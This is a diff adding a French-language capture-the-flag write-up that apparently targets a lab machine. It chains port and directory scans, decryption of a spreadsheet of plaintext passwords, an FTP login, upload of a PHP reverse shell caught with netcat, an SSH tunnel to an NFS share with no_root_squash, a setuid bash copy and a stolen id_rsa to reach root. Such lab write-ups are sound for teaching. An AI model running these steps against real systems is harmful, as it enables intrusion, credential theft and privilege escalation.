@@ -1,0 +1,181 @@
+
+Scan des ports
+```bash
+nmap 10.10.210.152
+```
+=>
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+vérification des root du site web
+```bash
+gobuster dir -u http://10.10.210.152 -w Desktop/wordlists/dirb/common.txt
+```
+=>
+/.hta                 (Status: 403) [Size: 213]
+/.htaccess            (Status: 403) [Size: 218]
+/.htpasswd            (Status: 403) [Size: 218]
+/cgi-bin/             (Status: 403) [Size: 217]
+/hidden               (Status: 301) [Size: 236] [--> http://10.10.210.152/hidden/]
+/index.html           (Status: 200) [Size: 757]
+
+Dans le site web, dans la page hidden nous trouvons ceci
+http://10.10.210.152/hidden/
+=>
+Index of /hidden
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory 	 	-
+[ ]	stats.zip 	2021-12-07 15:48 	9.9K
+
+On peu téléchargé le zip et extraire les fichier à l'intérieur
+
+IL contient une clef et un excel crypté
+
+Nous pouvons le décrypté comme ceci
+
+```bash
+gpg --import .hidden-key
+```
+=>
+gpg: /root/.gnupg/trustdb.gpg: trustdb created
+gpg: key CA39F36CD0B69BF0: public key "Adam Ondra <adam@climbing.thm>" imported
+gpg: key CA39F36CD0B69BF0: secret key imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+
+```bash
+gpg --decrypt ClimbersStats.xlsx.gpg > customer.xlsx
+```
+=>
+gpg: encrypted with 3072-bit RSA key, ID 78390708D04F7F4E, created 2021-12-07
+      "Adam Ondra <adam@climbing.thm>"
+gpg: Signature made Tue Dec  7 15:46:54 2021 UTC
+gpg:                using RSA key 8D50652C1742742DD9E61321CA39F36CD0B69BF0
+gpg: Good signature from "Adam Ondra <adam@climbing.thm>" [unknown]
+gpg: WARNING: This key is not certified with a trusted signature!
+gpg:          There is no indication that the signature belongs to the owner.
+Primary key fingerprint: 8D50 652C 1742 742D D9E6  1321 CA39 F36C D0B6 9BF0
+
+Avec le site suivant nous pouvons ouvrir un excel en ligne gratuitement
+
+https://sheet.zoho.com/sheet/excelviewer
+
+en ouvrant notre fichier excel nous obtenons
+
+Climber Name    | Username    | Password                    | Max grade
+----------------+-------------+-----------------------------+--------------------
+Adam Ondra      | adam        | bibliographieSeemsTough2022 | 9c (Secret project)
+Magnus Mitbo    | magnus      | youtubeIsClimbingToo        | 9b Ali Hulk
+Janja Garnbret  | janja       | theClimbingMonster          | 9a Seleccio Natural
+
+Nous pouvons nous connecté au port ftp, en essayant les 3 user 1 par 1 et nous obtenons
+
+```bash
+ftp 10.10.210.152
+```
+=>
+Connected to 10.10.210.152.
+220 (vsFTPd 3.0.3)
+Name (10.10.210.152:root): magnus
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+
+dans un autre terminal creer un shell.php avec ce lien:
+
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+transféré notre fichier shell.php dans le ftp
+```bash
+ftp>put shell.php
+```
+
+Dans notre shell on va acceuillir le reverse shell
+```bash
+nc -lvnp 1234
+```
+
+puis dans internet on peut aller sur notre shell.php
+
+http://10.10.210.152/shell.php
+
+Dans le ftp nous pouvons chercher le fichier web.txt
+
+```bash
+find / -name web.txt 2>/dev/null
+```
+=>
+/usr/share/httpd/web.txt
+
+En réutilisant le mot de passe trouvé plus haut nous devenons magnus avec cette commande
+
+```bas
+su magnus
+```
+
+En explorant les fichier nous pouvons trouvé ceci
+
+```bash
+cat /etc/exports
+```
+=>
+/home/adam *(rw,fsid=0,sync,no_root_squash,insecure)
+
+Ceci indique que le répertoire de travail l’utilisateur adam est partagé avec l’argument no_root_squash.
+
+mais NFS écoute seulement en local
+
+nous allons utiliser la méthode du SSH Tunneling pour résoidre ce probleme
+
+dans un autre terminal généré une clef ssh
+```bash
+ssh-keygen -f key_magnus
+```
+
+dans l'autre terminal copier coller notre key_magnus.public
+
+nous pouvons ensuite nous connecté en ssh
+
+```bash
+ssh -i key_magnus magnus@<ip>
+```
+
+puis de forwrad d'une machine a l'autre sur le port 2049
+
+```bash
+ssh -i key_magnus magnus@<ip> -L 2049:127.0.0.1:2049
+```
+
+nous pouvons maintenant regarder le partage avec adam
+
+```bash
+mkdir /tmp/mikadmin.fr
+mount -v -t nfs4 127.0.0.1:/ /tmp/mikadmin.fr
+cp /bin/bash .
+chmod +s bash
+```
+
+et nous pouvons récupéré le flag user
+
+```bash
+cat user.txt
+```
+
+en allant dans .ssh nous pouvons récupéré des id_rsa
+et nous connecté en ssh en tant que adam
+
+```bash
+ssh adam@<ip> -i id_rsa
+```
+
+NOus pouvons trouvé facilement le flag root
+
+```bash
+cat /root/root.txt
+```
